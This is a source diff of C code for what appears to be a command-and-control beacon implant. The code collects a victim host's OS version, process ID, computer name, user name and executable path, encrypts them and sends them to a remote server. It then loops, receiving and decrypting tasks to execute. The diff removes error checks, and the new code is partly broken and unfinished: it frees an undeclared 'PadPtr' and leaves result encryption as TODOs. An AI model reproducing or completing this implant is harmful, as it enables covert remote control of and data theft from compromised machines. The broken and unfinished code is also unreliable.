@@ -160,100 +160,29 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 									{
 										if ((Hdr = BufferCreate( &Ins, sizeof( BEACON_METADATA_HDR ))))
 										{
-											if (!(Buf = BufferAddRaw( &Ins, Hdr, Ins.BeaconKeys, 16 )))
-												break; 
-											else Hdr = Buf;
-											
-											if (!(Buf = BufferAddUI2( &Ins, Hdr, Ins.api.GetACP())) )
-												break; 
-											else Hdr = Buf;
-											
-											if (!(Buf = BufferAddUI2( &Ins, Hdr, Ins.api.GetOEMCP())) ) 
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddUI4( &Ins, Hdr, HTONL(Ins.BeaconId) )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddUI4( &Ins, Hdr, HTONL(Ins.api.GetCurrentProcessId()) )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddUI2( &Ins, Hdr, 0 )))
-												break;
-											else Hdr = Buf;
-
-											//
-											// TODO:
-											//
-											// 1. Check if the OS is x64
-											// 2. Check if the Beacon is admin
-											// 3. Check if the Beacon is SYSTEM
-											//
+											Hdr = BufferAddRaw( &Ins, Hdr, Ins.BeaconKeys, 16 );
+											Hdr = BufferAddUI2( &Ins, Hdr, Ins.api.GetACP());
+											Hdr = BufferAddUI2( &Ins, Hdr, Ins.api.GetOEMCP());
+											Hdr = BufferAddUI4( &Ins, Hdr, HTONL(Ins.BeaconId) );
+											Hdr = BufferAddUI4( &Ins, Hdr, HTONL(Ins.api.GetCurrentProcessId()) );
+											Hdr = BufferAddUI2( &Ins, Hdr, 0 );
 											#if defined( _WIN64 )
-											if (!(Buf = BufferAddUI1( &Ins, Hdr, BEACON_METADATA_FLAG_X64_AGENT )))
-												break;
-											else Hdr = Buf;
+											Hdr = BufferAddUI1( &Ins, Hdr, BEACON_METADATA_FLAG_X64_AGENT );
 											#else
-											if (!(Buf = BufferAddUI1( &Ins, Hdr, BEACON_METADATA_FLAG_NOTHING )))
-												break;
-											else Hdr = Buf;
+											Hdr = BufferAddUI1( &Ins, Hdr, BEACON_METADATA_FLAG_NOTHING );
 											#endif
-
-											if (!(Buf = BufferAddUI1( &Ins, Hdr, NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddUI1( &Ins, Hdr, NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddUI2( &Ins, Hdr, HTONS(NtCurrentTeb()->ProcessEnvironmentBlock->OSBuildNumber) )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddUI4( &Ins, Hdr, 0 )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddUI4( &Ins, Hdr, 0 )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddUI4( &Ins, Hdr, 0 )))
-												break;
-											else Hdr = Buf;
-
-											//
-											// TODO
-											//
-											// Calculate IPv4 address instead of setting
-											// to 0
-											//
-											if (!(Buf = BufferAddUI4( &Ins, Hdr, 0 )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddRaw( &Ins, Hdr, Cmp, strlen(Cmp) )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddUI1( &Ins, Hdr, '\t' )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddRaw( &Ins, Hdr, Usr, strlen(Usr) )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddUI1( &Ins, Hdr, '\t' )))
-												break;
-											else Hdr = Buf;
-
-											if (!(Buf = BufferAddRaw( &Ins, Hdr, Exe, strlen(Exe) )))
-												break;
-											else Hdr = Buf;
+											Hdr = BufferAddUI1( &Ins, Hdr, NtCurrentTeb()->ProcessEnvironmentBlock->OSMajorVersion );
+											Hdr = BufferAddUI1( &Ins, Hdr, NtCurrentTeb()->ProcessEnvironmentBlock->OSMinorVersion );
+											Hdr = BufferAddUI2( &Ins, Hdr, HTONS(NtCurrentTeb()->ProcessEnvironmentBlock->OSBuildNumber) );
+											Hdr = BufferAddUI4( &Ins, Hdr, 0 );
+											Hdr = BufferAddUI4( &Ins, Hdr, 0 );
+											Hdr = BufferAddUI4( &Ins, Hdr, 0 );
+											Hdr = BufferAddUI4( &Ins, Hdr, 0 );
+											Hdr = BufferAddRaw( &Ins, Hdr, Cmp, strlen(Cmp) );
+											Hdr = BufferAddUI1( &Ins, Hdr, '\t' );
+											Hdr = BufferAddRaw( &Ins, Hdr, Usr, strlen(Usr) );
+											Hdr = BufferAddUI1( &Ins, Hdr, '\t' );
+											Hdr = BufferAddRaw( &Ins, Hdr, Exe, strlen(Exe) );
 
 											if ((Buf = Ins.api.LocalLock( Hdr )))
 											{
@@ -264,18 +193,18 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 												{
 													if ( TransportInit( &Ins ) )
 													{
-														if ( TransportSend( &Ins, Ecp, Ecl ) )
-															Ins.IsOnline = TRUE;
-														else TransportFree( &Ins );
+														if ( TransportSend( &Ins, Ecp, Ecl ) ) {
+															Ins.IsOnline = TRUE; Ins.LastTask++;
+														} else TransportFree( &Ins );
 													};
 													Ins.api.LocalFree( Ecp );
 												};
 												Ins.api.LocalUnlock( Hdr );
 											};
+											Ins.api.LocalFree( Hdr );
 										};
 									} while ( 0 );
 
-									Ins.api.LocalFree( Hdr );
 									Ins.api.LocalFree( Exe );
 								};
 								Ins.api.LocalFree( Usr );
@@ -324,30 +253,60 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 
 					if ( CryptHmacInit( &Ins ) )
 					{
-						PVOID AesBuf = NULL;
-						ULONG AesLen = 0;
-						PVOID TxtBuf = NULL;
-						ULONG TxtLen = 0;
-
 						do
 						{
+							PBEACON_TASK_RES_HDR ResHdr = NULL;
+							PBEACON_TASK_ENC_HDR EncHdr = NULL;
+							PVOID                TskPtr = NULL;
+							PVOID                TxtBuf = NULL;
+							ULONG                TxtLen = 0;
+							ULONG                PadLen = 0;
+
 							if ( TransportRecv( &Ins, &TxtBuf, &TxtLen ) )
 							{
-								if ( CryptAesDecrypt( &Ins, TxtBuf, TxtLen ) )
+								//
+								// Check if the buffer is a multiple of
+								// 16. If it is, continue. In the server,
+								// do not send the NO-OP frames to the
+								// Beacon.
+								//
+								if ( CryptAesDecrypt( &Ins, TxtBuf, TxtLen - 16 ) )
 								{
-									__debugbreak();
+									if ((TskPtr = BeaconTask( &Ins, CPTR( TxtBuf ) )))
+									{
+										if (( ResHdr = Ins.api.LocalLock( TskPtr )))
+										{
+											PadLen = ( ResHdr->Length + 32 - 1 ) & ~( 32 - 1 );
+
+											if (( EncHdr = Ins.api.LocalAlloc( LPTR, 4 + PadLen + 16 ) ))
+											{
+												//
+												// TODO:
+												//
+												// AES-128-CBC encrypt the ResHdr and store it in EncHdr.
+												// MAC-SHA-256 the encrypted buffer and store it in EncHdr.
+												// Set length of EncHdr to that of AES + 16
+												//
+												// Send to target.
+												Ins.api.LocalFree( PadPtr );
+											};
+											Ins.api.LocalUnlock( TskPtr );
+										};
+
+										Ins.api.LocalFree( TskPtr );
+									};
 								};
 								Ins.api.LocalFree( TxtBuf );
 							};
-						} while ( TRUE );
+						} while ( Ins.IsOnline != FALSE );
 
 						CryptHmacFree( &Ins );
 					};
 					CryptAesFree( &Ins );
 				};
-				RtlSecureZeroMemory( &AesMacKeyBuffer, sizeof( AesMacKeyBuffer ) ); 
 				Ins.api.LocalFree( Sum );
 			};
+			TransportFree( &Ins );
 		};
 
 		if ( Ins.Module[2] != NULL )
